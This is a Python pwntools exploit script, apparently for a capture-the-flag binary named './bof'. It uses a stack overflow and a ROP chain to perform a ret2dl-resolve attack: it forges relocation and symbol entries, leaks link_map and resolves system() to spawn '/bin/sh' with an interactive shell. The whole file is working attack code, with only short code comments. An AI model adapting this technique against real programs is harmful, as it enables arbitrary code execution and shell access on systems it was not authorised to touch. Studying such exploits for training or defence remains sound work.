from pwn import *

r = process('./bof')
e = ELF('./bof')
def packAll(rop):
    return flat([p64(x) for x in rop])
STRTAB = 0x400330# for function name
SYMTAB = 0x4002b8# for forging sym entry
JMPREL = 0x4003b8# for forging reloc entry
plt_start = 0x400420
prdi = 0x0000000000400571# : pop rdi ; ret
prsi = 0x0000000000400573# : pop rsi ; ret
prdx = 0x0000000000400579# : pop rdx ; ret

str_buf = 0x601800-0x8
buf = 0x601808

# forge reloc entry
idx = (buf+0x20-SYMTAB)/0x18
r_info = (idx<<32)|0x7
reloc = [buf+0x200, r_info, 0]
st_name = 0x12<<32|(str_buf+0x8-STRTAB)
sym = [st_name, 0, 0]
data = packAll(reloc)+p64(0)+packAll(sym)

# forge sym entry

rop = []

# inject /bin/sh
rop += [prdi, 0]
rop += [prsi, str_buf]
rop += [prdx, 0x10]
rop += [e.plt['read']]

# inject fake entries
rop += [prdi, 0]
rop += [prsi, buf]
rop += [prdx, len(data)]
rop += [e.plt['read']]

# leak link_map
rop += [prdi, 1]
rop += [prsi, 0x601008]
rop += [prdx, 8]
rop += [e.plt['write']]

rop += [e.symbols['main']]

# first time invode to leak link_map and prepare buffer and fake entries 
payload = 'A'*120+packAll(rop)
r.send(p64(0x200))
r.send(payload.ljust(0x1f8, 'B')+'C'*8)
r.sendafter('C'*8, '/bin/sh\x00'+'system'.ljust(8, '\x00'))
r.send(data)

link_map = u64(r.recv(8))
target = link_map+0x1c8
print 'target:', hex(target)
rop = []
# set link_map+0x1c8 = 0
rop += [prdi, 0]
rop += [prsi, target]
rop += [prdx, 8]
rop += [e.plt['read']]

# invoke dl-resolve
rop += [prdi, str_buf]
#rop += [prdi, 1]
#rop += [prsi, str_buf+0x8]
#rop += [prdx, 8]
rop += [plt_start, (buf-JMPREL)/0x18]

# pause for debugging
rop += [prdi, 0]
rop += [prsi, target]
rop += [prdx, 8]
rop += [e.plt['read']]

payload = 'A'*120+packAll(rop)
r.send(p64(0x200))
r.send(payload.ljust(0x1f8, 'B')+'C'*8)
r.sendafter('C'*8, '\x00'*8)
r.interactive()
